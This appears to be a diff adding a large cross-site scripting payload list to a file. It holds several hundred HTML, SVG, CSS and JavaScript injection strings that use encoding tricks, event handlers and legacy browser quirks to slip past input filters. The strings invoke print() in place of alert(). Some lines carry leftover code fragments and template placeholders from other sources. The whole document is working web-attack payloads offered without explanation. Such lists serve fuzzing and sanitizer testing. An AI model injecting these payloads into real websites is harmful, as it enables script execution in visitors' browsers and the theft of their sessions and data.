+<? foo="><script>javascript:print()</script>">
+<! foo="><script>javascript:print()</script>">
+</ foo="><script>javascript:print()</script>">
+<? foo="><x foo='?><script>javascript:print()</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:print()</script>">
+<% foo><x foo="%><script>javascript:print()</script>">
+<div id=d><x xmlns="><iframe onload=javascript:print()"></div> <script>d.innerHTML=d.innerHTML</script>
+<img \x00src=x onerror="print()">
+<img \x47src=x onerror="javascript:print()">
+<img \x11src=x onerror="javascript:print()">
+<img \x12src=x onerror="javascript:print()">
+<img\x47src=x onerror="javascript:print()">
+<img\x10src=x onerror="javascript:print()">
+<img\x13src=x onerror="javascript:print()">
+<img\x32src=x onerror="javascript:print()">
+<img\x11src=x onerror="javascript:print()">
+<img \x34src=x onerror="javascript:print()">
+<img \x39src=x onerror="javascript:print()">
+<img \x00src=x onerror="javascript:print()">
+<img src\x09=x onerror="javascript:print()">
+<img src\x10=x onerror="javascript:print()">
+<img src\x13=x onerror="javascript:print()">
+<img src\x32=x onerror="javascript:print()">
+<img src\x12=x onerror="javascript:print()">
+<img src\x11=x onerror="javascript:print()">
+<img src\x00=x onerror="javascript:print()">
+<img src\x47=x onerror="javascript:print()">
+<img src=x\x09onerror="javascript:print()">
+<img src=x\x10onerror="javascript:print()">
+<img src=x\x11onerror="javascript:print()">
+<img src=x\x12onerror="javascript:print()">
+<img src=x\x13onerror="javascript:print()">
+<img[a][b][c]src[d]=x[e]onerror=[f]"print()">
+<img src=x onerror=\x09"javascript:print()">
+<img src=x onerror=\x10"javascript:print()">
+<img src=x onerror=\x11"javascript:print()">
+<img src=x onerror=\x12"javascript:print()">
+<img src=x onerror=\x32"javascript:print()">
+<img src=x onerror=\x00"javascript:print()">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:print()>XXX</a>
+<img src="x` `<script>javascript:print()</script>"` `>
+<img src onerror /" '"= alt=javascript:print()//">
+<title onpropertychange=javascript:print()></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:print()></a>">
+<!--[if]><script>javascript:print()</script -->
+<!--[if<img src=x onerror=javascript:print()//]> -->
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:print()" style="behavior:url(#x);"><param name=postdomevents /></object>
+<a style="-o-link:'javascript:javascript:print()';-o-link-source:current">X
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:print()'}{}*{-o-link-source:current}]{color:red};</style>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:print())%7d
+<style>@import "data:,*%7bx:expression(javascript:print())%7D";</style>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:print();">XXX</a></a><a href="javascript:javascript:print()">XXX</a>
+<// style=x:expression\28javascript:print()\29>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:print())}</style>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:print());">X
+<script>({set/**/$($){_/**/setter=$,_=javascript:print()}}).$=eval</script>
+<script>({0:#0=eval/#0#/#0#(javascript:print())})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:print()}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:print()')()</script>
+<meta charset="mac-farsi">¼script¾javascript:print()¼/script¾
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:print()` >
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:print()&gt;`>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:print()&gt;>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:print() strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:print()">XXX</a>
+<event-source src="%(event)s" onload="javascript:print()">
+<a href="javascript:javascript:print()"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:print()&gt;">
+<script>javascript:print()</script>
+<IMG SRC="javascript:javascript:print();">
+<IMG SRC=javascript:javascript:print()>
+<IMG SRC=`javascript:javascript:print()`>
+<FRAMESET><FRAME SRC="javascript:javascript:print();"></FRAMESET>
+<BODY ONLOAD=javascript:print()>
+<BODY ONLOAD=javascript:javascript:print()>
+<IMG SRC="jav    ascript:javascript:print();">
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:print()>
+<IMG SRC="javascript:javascript:print()"
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:print();">
+<IMG DYNSRC="javascript:javascript:print()">
+<IMG LOWSRC="javascript:javascript:print()">
+<BGSOUND SRC="javascript:javascript:print();">
+<BR SIZE="&{javascript:print()}">
+<LINK REL="stylesheet" HREF="javascript:javascript:print();">
+<STYLE>li {list-style-image: url("javascript:javascript:print()");}</STYLE><UL><LI>XSS
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:print();">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:print();">
+<IFRAME SRC="javascript:javascript:print();"></IFRAME>
+<TABLE BACKGROUND="javascript:javascript:print()">
+<TABLE><TD BACKGROUND="javascript:javascript:print()">
+<DIV STYLE="background-image: url(javascript:javascript:print())">
+<DIV STYLE="width:expression(javascript:print());">
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:print())">
+<XSS STYLE="xss:expression(javascript:print())">
+<STYLE TYPE="text/javascript">javascript:print();</STYLE>
+<STYLE>.XSS{background-image:url("javascript:javascript:print()");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:print()")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>javascript:print();</SCRIPT><![endif]-->
+<BASE HREF="javascript:javascript:print();//">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:print()></OBJECT>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:print()"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:print()&lt;/SCRIPT&gt;"></BODY></HTML>
+<form id="test" /><button form="test" formaction="javascript:javascript:print()">X
+<body onscroll=javascript:print()><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:print()">
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:print();');}</STYLE>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:print()&&;&&<&&/script&&>
+<SCRIPT onreadystatechange=javascript:javascript:print();></SCRIPT>
+<style onreadystatechange=javascript:javascript:print();></style>
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:print();</html:script></html:html>
+<embed code=javascript:javascript:print();></embed>
+<frameset onload=javascript:javascript:print()></frameset>
+script\x20type="text/javascript">javascript:print();</script>
+<applet code="javascript:print();">
+<isindex x="javascript:" onmouseover="print()">
+"><img src="x:x" onerror="print()">
+"><iframe src="javascript:print()">
+<isindex type=image src=1 onerror=print()>
+<img src=x:print() onerror=eval(src) alt=0>
+<iframe/src="data:text/html,<svg onload=print()>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; print()" http-equiv="refresh"/>
+<meta http-equiv="refresh" content="0;url=javascript:print()">
+</script><img/*%00/src="worksinchrome&colon;print()"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(print())}//<style></style>
+<script x> print() </script 1=2
+<form><button formaction=javascript&colon;print()>CLICKME
+<javascript:print()
+xss=500); print();//
++ADw-SCRIPT+AD4-print();+ADw-/SCRIPT+AD4-
+<DIV STYLE="background-image: url(javascript:print())">
+<TABLE><TD BACKGROUND="javascript:print()">
+<TABLE BACKGROUND="javascript:print()">
+<IFRAME SRC=# onmouseover="print()"></IFRAME>
+xss:ex/*XSS*//*/*/pression(print())'>
+<STYLE>li {list-style-image: url("javascript:print()");}</STYLE><UL><LI>XSS</br>
+<IMG LOWSRC="javascript:print()">
+<IMG DYNSRC="javascript:print()">
+<BODY BACKGROUND="javascript:print()">
+<<SCRIPT>print();//\<</SCRIPT>
+<IMG onmouseover="print()">
+<IMG SRC= onmouseover="print()">
+<IMG SRC=# onmouseover="print()">
+<IMG """><SCRIPT>print()</SCRIPT>"\>
+\<a onmouseover=print()\>xxs link\</a\>
+\<a onmouseover="print()"\>xxs link\</a\>
+' onmouseover=print()
+<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    print(); }catch(e){} };  xdr.send(); </script>
+<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); print(); } } xmlHttp.send(null); }; </script>
+<script>  (function (o) {   function exploit(x) {    if (x !== null)     print();    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
+<img src=http://www.google.fr/images/srpr/logo3w.png onload=print() width=0 height= 0 /> #
+<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); print(); } } xmlHttp.send(null); }; </script>#
+<script> var+x+=+showModelessDialog+(this); print(); </script>
+<textarea id=ta onfocus=%22write('<script>print()</script>')%22 autofocus></textarea>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="print()">
+<var onmouseover="print()">On Mouse Over</var>?
+<%<!--'%><script>print();</script -->
+<svg/onload=print()
+<input value=<><iframe/src=javascript:print()
+<input type="text" value=``<div/onmouseover='print()'>X</div>
+http://www.<script>print()</script .com
+<svg><script ?>print()
+<img src=`xx:xx`onerror=print()>
+<meta http-equiv="refresh" content="0;javascript&colon;print()"/>?
+<script>+-+-1-+-+print()</script>
+<script itworksinallbrowsers>/*<script* */print()</script ?
+<img src ?itworksonchrome?\/onerror = print()???
+<svg><script>//&NewLine;print();</script </svg>
+<svg><script onlypossibleinopera:-)> print()
+<div/onmouseover='print()'> style="x:">
+<--`<img/src=` onerror=print()> --!>
+<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="print()" onclick="print()">x</button>?
+"><img src=x onerror=print();>: \');print();//
+<script>eval('\\u'+'0061'+'lert(1)')</script>     <script>throw~delete~typeof~print()</script>     <script>delete[a=alert]/prompt a(1)</script>     <script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>     <script>(()=>{return this})().print()</script>
+<script>new function(){new.target.constructor('print()')();}</script>     <script>Reflect.construct(function(){new.target.constructor('print()')()},[])</script>
+<link rel="import" href="data:x,<script>print()</script>     <script>Array.from1${alert}3${window}2</script>
+<script>!{x(){print()}}.x()</script>     <script>Array.from${eval}alert\1\``</script>     <script>Array.from([1],alert)</script>     <script>Promise.reject("1").then(null,alert)</script>
+<p onbeforescriptexecute="print()"><svg><script>\</p>
+<img onerror=print() src <u></u>     <videogt;<source onerror=javascript:print()gt;
+<base target="<script>print()</script>"><a href="javascript:name">CLICK</a>
+<base href="javascript:/"><a href="**/print()"><base href="javascript:/"><a href="**/print()">
+<style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=print()> <
+<script>throw new class extends Function{}('print()')``</script>     <script>x=new class extends Function{}('print()'); x=new x;</script>     <script>new class extends print(){}</script>
+<script>new class extends class extends class extends class extends print(){}{}{}{}</script>
+"><svg><script/xlink:href="data:,print()     <svg><script/xlink:href=data:,print()></script>     <frameset/onpageshow=print()>
+<div onactivate=print() id=xss style=overflow:scroll>
+<div onfocus=print() id=xss style=display:table>
+<img src=x onerror=print() onerror=print() onerror=print()>
+</script><svg><script>print()-%26apos%3B
+anythinglr00</script><script>print()</script>uxldz
+<a href=javas&#99;ript:print()>
+<iframe srcdoc="&lt;svg/onload=print()&gt;">
+javascript:print():
+'><img src=x onError=print()>
+'><img+sRc=l+oNerrOr=print()+x>
+<script>x = '<!--<script>'/*</script>-->*/;print()</script
+<</p>iframe src=javascript:print()//
+<frameset onpageshow=print()>
+<svg onunload=http://window.open ('javascript:print()')>
+<xss<script>>&28;print();&28;<</script>/xss>
+<svg><b><style><img id="&lt;/style&gt;&lt;img src=1 onerror=print()&gt;">
+<</div>script</div>>print()<</div>/script</div>>
+"><svg onload=print()>
+</tag><svg onload=print()>
+"></tag><svg onload=print()>
+"onmouseover=print() //
+"autofocus onfocus=print() //
+<svg id=javascript:print() onload=location=id>
+<img src="img-src" onloadstart="print()">
+<img src="img-src" onloadend="print()">
+'}print();{'
+'}print()%0A{'
+\'}print();{//
+-print()//\
+-print()}//\
+${print()}
+p=<svg/1='&q='onload=print()>
+p=<svg 1='&q='onload='/*&r=*/print()'>
+q=<script/&q=/src=data:&q=print()>
+"><svg onload=print()>.gif
+<img src=1 onerror=print()>
+<details open ontoggle=print()>
+<svg><svg onload=print()>
+data:text/html,<img src=1 onerror=print()>
+data:text/html,<iframe src=javascript:print()>
+><svg onload=print()>?a=reader
+<script src=data:,print()>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">print()</x:script>
+<p style=overflow:auto;font-size:999px onscroll=print()>AAA<x/id=y></p>#y
+<<!--%23set var="x" value="svg onload=print()"--><!--%23echo var="x"-->>
+1<svg onload=print()>
+1"><svg onload=print()>
+'1<svg onload=print()>
+<svg onload=print()>\
+<Svg OnLoad=print()>
+<Script>print()</Script>
+<svg onload=print()//
+<svg onload="print()"
+<script/x>print()</script>
+<script src=https://www.google.com/complete/search?client=chrome%26jsonp=print();></script>
+<x onauxclick=print()>right click this!
+'-print()-'<svg>
+\'-print()//<svg>
+<svg/on<script><script>load=print()//</script>
+<SCRİPT>print()</SCRİPT>
+<SCRİPT/SRC=data:,print()>
+<svg><set onbegin=print()>
+<svg><set end=1 onend=print()>
+%u003Csvg onload=print()>
+%u3008svg onload=print()>
+%uFF1Csvg onload=print()>
+"><svg/onload=print()>"@x.y
+</script><svg><script>print()//
+</script><script>'%0B'-print()//
+"`-print()</script><script>`
+?p[<script>`]=`/print()</script>
+<x onmouseenter=print()>
+<x onafterscriptexecute=print()>
+<x onbeforescriptexecute=print()>
+<x onanimationend=print()><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationend=print()><style>x{animation:s}@keyframes s{}
+<body onhashchange=print()><a href=%23x>click this!#x
+<body onscroll=print()><br><br><br><br><br><br><br><br><br><br><br><br>
+<body onhelp=print()>press F1!
+<object onerror=print()>
+z" onmouseover="print()" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">
+%22><svg%20onload=print();>
+"><h1><IFRAME SRC=# onmouseover="print()"></IFRAME>123</h1>"
+<object onerror=javascript:javascript:print()>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:print();">]]</C><X></xml>
+<IMG SRC=&{javascript:print();};>
+<a href="jav&#65ascript:javascript:print()">test1</a>
+<a href="jav&#97ascript:javascript:print()">test1</a>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:print()&amp;gt;>">
+<a onmouseover="print()">xxs link</a>
+<a onmouseover=print()>xxs link</a>
+perl -e 'print "<IMG SRC=java\0script:print()>";' > out
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(print())'>
+<iframe %00 src="&Tab;javascript:print()&Tab;"%00>
+<svg><style>{font-family&colon;'<iframe/onload=print()>'
+<img/src=`%00` onerror=this.onerror=print()
+<form><isindex formaction="javascript&colon;print()"
+<img src=`%00`&NewLine; onerror=print()&NewLine;
+<ScRipT 5-0*3+9/3=>print()</ScRipT giveanswerhere=?
+<script /*%00*/>/*%00*/print()/*%00*/</script /*%00*/
+<iframe/src="data:text/html,<svg &#111;&#110;load=print()>">
+<img/&#09;&#10;&#11; src=`~` onerror=print()>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;print()"&#11;&#10;&#09;;>
+http://www.google<script .com>print()</script
+<img/src=@&#32;&#13; onerror = print()
+</style &#32;><script &#32; :-(>/**/print()/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="print()">
+<script /***/>/***/print()/***/</script /***/
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:print()&NewLine;>X</a>
+<script ~~~>print()</script ~~~>
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;print()
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=print()>'
+<div/style="width:expression(print())">X</div> {IE7}
+<iframe/%00/ src=javaSCRIPT&colon;print()
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=print() /*iframe/src*/>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=print()>'</font>/</style>
+<a/href="javascript:&#13; javascript:print()"><input type="X">
+</plaintext\></|\><plaintext/onmouseover=print()
+<var onmouseover="print()">On Mouse Over</var>
+<input type="text" value=`` <div/onmouseover='print()'>X</div>
+<meta http-equiv="refresh" content="0;javascript&colon;print()"/>
+<script itworksinallbrowsers>/*<script* */print()</script
+<img src ?itworksonchrome?\/onerror = print()
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="print()" onclick="print()">x</button>
+‘; print();
+‘)print();//
+<ScRiPt>print()</sCriPt>
+<IMG SRC=jAVasCrIPt:print()>
+<IMG SRC=”javascript:print();”>
+<img src=xss onerror=print()>
+<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="print()">
+<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="print()" onclick="print()">x</button>
+<IMG “””><SCRIPT>print()</SCRIPT>”>
+<IMG SRC=”jav ascript:print();”>
+<IMG SRC=”jav&#x09;ascript:print();”>
+“><s”%2b”cript>print()</script>
+foo<script>print()</script>
+<scr<script>ipt>print()</scr</script>ipt>
+<BODY BACKGROUND=”javascript:print()”>
+<INPUT TYPE=”IMAGE” SRC=”javascript:print();”>
+<IMG SRC=”javascript:print()”
+<img src="javascript:print();">
+<img src=javascript:print()>
+<script>print()</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<script>print();</script>&search=1
+<body onscroll=print()><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form><button formaction="javascript:print()">lol
+<!--<img src="--><img src=x onerror=print()//">
+<![><img src="]><img src=x onerror=print()//">
+<style><img src="</style><img src=x onerror=print()//">
+<? foo="><script>print()</script>">
+<! foo="><script>print()</script>">
+</ foo="><script>print()</script>">
+<? foo="><x foo='?><script>print()</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>print()</script>">
+<% foo><x foo="%><script>print()</script>">
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>print()</script></svg>
+&lt;SCRIPT&gt;print()&lt;/SCRIPT&gt;
+\\";print();//
+&lt;/TITLE&gt;&lt;SCRIPT&gt;print();&lt;/SCRIPT&gt;
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;print();\"&gt;
+&lt;BODY BACKGROUND=\"javascript&#058;print()\"&gt;
+&lt;BODY ONLOAD=print()&gt;
+&lt;IMG DYNSRC=\"javascript&#058;print()\"&gt;
+&lt;IMG LOWSRC=\"javascript&#058;print()\"&gt;
+&lt;BGSOUND SRC=\"javascript&#058;print();\"&gt;
+&lt;BR SIZE=\"&{print()}\"&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;print();\"&gt;
+&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;print()\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;print();\"&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;print();\"
+&lt;IFRAME SRC=\"javascript&#058;print();\"&gt;&lt;/IFRAME&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;print();\"&gt;&lt;/FRAMESET&gt;
+&lt;TABLE BACKGROUND=\"javascript&#058;print()\"&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;print()\"&gt;
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;print())\"&gt;
+&lt;DIV STYLE=\"width&#58; expression(print());\"&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;print()';&lt;/STYLE&gt;
+&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(print())\"&gt;
+&lt;XSS STYLE=\"xss&#58;expression(print())\"&gt;
+xss&#58;ex&#x2F;*XSS*//*/*/pression(print())'&gt;
+&lt;STYLE TYPE=\"text/javascript\"&gt;print();&lt;/STYLE&gt;
+&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;print()\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;print()\")}&lt;/STYLE&gt;
+&lt;SCRIPT&gt;print();&lt;/SCRIPT&gt;
+&lt;BASE HREF=\"javascript&#058;print();//\"&gt;
+&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;print()&gt;&lt;/OBJECT&gt;
+d=\"print();\\")\";
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;print();\"&gt;&#93;&#93;&gt;
+&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;print()\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;print()&lt;/SCRIPT&gt;\"&gt;
+echo('IPT&gt;print()&lt;/SCRIPT&gt;'); ?&gt;
+&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;print()&lt;/SCRIPT&gt;\"&gt;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-print();+ADw-/SCRIPT+AD4-
+&lt;IMG SRC=\"javascript&#058;print()\"
+&lt;&lt;SCRIPT&gt;print();//&lt;&lt;/SCRIPT&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=print()&gt;
+&lt;IMG SRC=\"   javascript&#058;print();\"&gt;
+perl -e 'print \"&lt;SCR\0IPT&gt;print()&lt;/SCR\0IPT&gt;\";' &gt; out
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;print()&gt;\";' &gt; out
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;print();\"&gt;
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;print();\"&gt;
+&lt;IMG SRC=\"jav&#x09;ascript&#058;print();\"&gt;
+&lt;IMG SRC=javascript&#058;print()&gt;
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;print()&lt;/SCRIPT&gt;\"&gt;
+&lt;IMG SRC=`javascript&#058;print()`&gt;
+&lt;IMG SRC=JaVaScRiPt&#058;print()&gt;
+&lt;IMG SRC=\"javascript&#058;print();\"&gt;
+<IMG SRC=javascrscriptipt:print()>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(print())'>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;print()&lt;/SCRIPT&gt;"></BODY></HTML>
+<form id="test" /><button form="test" formaction="javascript:print()">TESTHTML5FORMACTION
+<form><button formaction="javascript:print()">crosssitespt
+<frameset onload=print()>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){print()}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('print()')()</script>
+<script src="#">{print()}</script>;1
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'print()',384,null,'rsa-dual-use')</script>
+<svg xmlns="#"><script>print()</script></svg>
+<svg onload="javascript:print()" xmlns="#"></svg>
+<iframe xmlns="#" src="javascript:print()"></iframe>
++ADw-script+AD4-print()+ADw-/script+AD4-
+%2BADw-script+AD4-print()%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-print()+ADw-/script+AD4APAAi-
+“><ScRiPt>print()</script>
+“><<script>print();//<</script>
+‘; print(); var foo=’
+foo\’; print();//’;
+</script><script >print()</script>
+<img src=asdf onerror=print()>
+<video src=1 onerror=print()>
+<audio src=1 onerror=print()>
+0\"autofocus/onfocus=print()--><video/poster/onerror=print()>"-print()-"
+<script/src=data:,print()>
+<marquee/onstart=print()>
+<video/poster/onerror=print()>
+<isindex/autofocus/onfocus=print()>
+0\"autofocus/onfocus=print()--><video/poster/ error=print()>"-print()-"
+veris-->group<svg/onload=print()//
+element[attribute='<img src=x onerror=print();>
+[<blockquote cite="]">[" onmouseover="print();" ]
+<w contenteditable id=x onfocus=print()>
+<scr<script>ipt>print()</scr</script>ipt><scr<script>ipt>print()</scr</script>ipt>
+<sCR<script>iPt>print()</SCr</script>IPt>
+<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="print()";
+<INPUT TYPE="BUTTON" action="print()"/>
+"><h1><IFRAME SRC="javascript:print();"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="print()"></IFRAME>123</h1>
+"></iframe><script>print();</script><iframe frameborder="0%EF%BB%BF
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="print()"></IFRAME>123</h1>
+<IFRAME width="420" height="315" frameborder="0" onload="print()"></IFRAME>
+<iframe  src="&Tab;javascript:print()&Tab;">
+<img/src=`` onerror=this.onerror=print()
+<img src=``&NewLine; onerror=print()&NewLine;
+<script /**/>/**/print()/**/</script /**/
+<iframe// src=javaSCRIPT&colon;print()
+"><img src=x onerror=javascript:print()>
+<IMG SRC="jav ascript:javascript:print();">
+<IMG SRC="jav ascript:print();">
+<script>print();</script>
+<scr<script>ipt>print();</scr</script>ipt>
+<img src=foo.png onerror=print() />
+<style>@im\port'\ja\vasc\ript:print()';</style>
+<? echo('<scr)'; echo('ipt>print()</script>'); ?>
+<marquee><script>print()</script></marquee>
+<IMG SRC=\"jav&#x09;ascript:print();\">
+<IMG SRC=\"jav&#x0A;ascript:print();\">
+<IMG SRC=\"jav&#x0D;ascript:print();\">
+"><script>print()</script>
+</textarea><script>print()</script>
+<IMG LOWSRC=\"javascript:print()\">
+<IMG DYNSRC=\"javascript:print()\">
+<font style='color:expression(print())'>
+<script language="JavaScript">print()</script>
+<body onunload="javascript:print();">
+<body onLoad="print();"
+[color=red' onmouseover="print()"]mouse over[/color]
+"/></a></><img src=1.gif onerror=print()>
+window.print();
+<iframe<?php echo chr(11)?> onload=print()></iframe>
+'">><script>print()</script>
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:print();\">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:print();\">
+<script>var var = 1; print()</script>
+<?='<SCRIPT>print()</SCRIPT>'?>
+" onfocus=print() "> <"
+<FRAMESET><FRAME SRC=\"javascript:print();\"></FRAMESET>
+<STYLE>li {list-style-image: url(\"javascript:print()\");}</STYLE><UL><LI>XSS
+perl -e 'print \"<SCR\0IPT>print()</SCR\0IPT>\";' > out
+perl -e 'print \"<IMG SRC=java\0script:print()>\";' > out
+<br size=\"&{print()}\">
+<scrscriptipt>print()</scrscriptipt>
+</br style=a:expression(print())>
+</script><script>print()</script>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=print()>
+[color=red width=expression(print())][color]
+"></iframe><script>print()</script>
